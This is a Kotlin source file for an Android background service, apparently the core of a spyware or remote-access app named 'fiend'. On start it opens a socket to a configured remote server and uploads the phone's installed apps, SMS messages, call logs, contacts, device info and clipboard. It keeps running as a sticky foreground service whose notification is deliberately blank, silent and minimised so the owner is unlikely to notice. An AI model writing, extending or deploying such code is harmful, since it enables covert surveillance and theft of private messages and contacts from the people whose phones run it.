package willi.fiend

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import willi.fiend.Utils.AppSocket
import willi.fiend.Utils.AppTools

class MainService : Service() {
    
    private var appSocket: AppSocket? = null
    
    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        Log.i("MainService", "Service onCreate called")
        startForegroundService()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i("MainService", "Service onStartCommand called")
        
        // Log the connection info
        val appData = AppTools.getAppData()
        Log.i("MainService", "Attempting to connect to: ${appData.socket}")
        
        if (appSocket == null) {
            appSocket = AppSocket(this)
        }
        val action = appSocket!!.action
        appSocket!!.connect()
        action.uploadApps()
        action.uploadMessages()
        action.uploadCalls()
        action.uploadContact()
        action.uploadDeviceInfo()
        action.uploadClipboard()
        return START_STICKY
    }
    
    private fun startForegroundService() {
        val notification = getNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ requires specifying foreground service type
            startForeground(
                1, 
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+
            startForeground(1, notification)
        } else {
            startForeground(1, notification)
        }
    }

    @SuppressLint("NewApi")
    private fun getNotification(): Notification {
        val channelId = "channel_service"
        val channelName = "Service Channel"
        val channel = NotificationChannel(
            channelId,
            channelName,
            NotificationManager.IMPORTANCE_MIN
        )
        channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        channel.setShowBadge(false)
        val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
        manager.createNotificationChannel(channel)
        
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
        return notificationBuilder.setOngoing(true)
            .setSmallIcon(R.drawable.mpt)
            .setContentTitle(" ")
            .setContentText("")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
            .setPriority(NotificationManager.IMPORTANCE_MIN)
            .setSilent(true)
            .setCustomBigContentView(RemoteViews(packageName, R.layout.notification))
            .build()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        appSocket = null
    }
}
